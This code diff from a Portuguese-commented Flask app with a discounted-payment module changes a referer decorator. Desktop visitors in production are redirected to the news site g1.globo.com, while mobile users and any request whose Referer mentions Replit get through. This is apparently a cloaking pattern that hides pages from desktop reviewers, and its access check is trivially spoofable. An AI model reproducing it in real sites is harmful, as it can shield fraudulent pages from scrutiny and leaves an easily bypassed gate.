@@ -11,7 +11,7 @@ import logging
 import urllib.parse
 import hashlib
 from datetime import datetime
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort, make_response
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort, make_response, g
 from dotenv import load_dotenv
 
 # Carregar variáveis de ambiente do arquivo .env
@@ -127,9 +127,34 @@ from pagamentocomdesconto import create_payment_with_discount_api
 AUTHORIZED_DOMAIN = "*"
 
 def check_referer(f):
+    """Decorator para verificar o referer das requisições e aplicar regras de acesso"""
     @functools.wraps(f)
     def decorated_function(*args, **kwargs):
-        # Permita acesso independente do referer
+        # Verificar se o usuário é mobile ou desktop
+        is_mobile = False
+        if hasattr(g, 'is_mobile'):
+            is_mobile = g.is_mobile
+        
+        # Verificar se estamos em modo de desenvolvimento
+        developing = os.environ.get('DEVELOPING', 'false').lower() == 'true'
+        
+        # Verificar se é uma requisição do Replit
+        referer = request.headers.get('Referer', '')
+        is_replit_request = 'replit' in referer.lower() or '.repl.' in referer.lower()
+        
+        # Em ambiente Replit, considerar como desenvolvimento
+        if is_replit_request:
+            developing = True
+        
+        # Verificar se a página é a de exemplo
+        is_exemplo_page = request.path.startswith('/exemplo')
+        
+        # Redirecionar desktops em produção (exceto replit e página de exemplo)
+        if not is_mobile and not developing and not is_replit_request and not is_exemplo_page:
+            app.logger.info(f"Redirecionando acesso desktop via check_referer: {referer}")
+            return redirect('https://g1.globo.com')
+            
+        # Permitir acesso para mobile ou em desenvolvimento
         app.logger.info(f"Permitindo acesso para a rota: {request.path}")
         return f(*args, **kwargs)
         
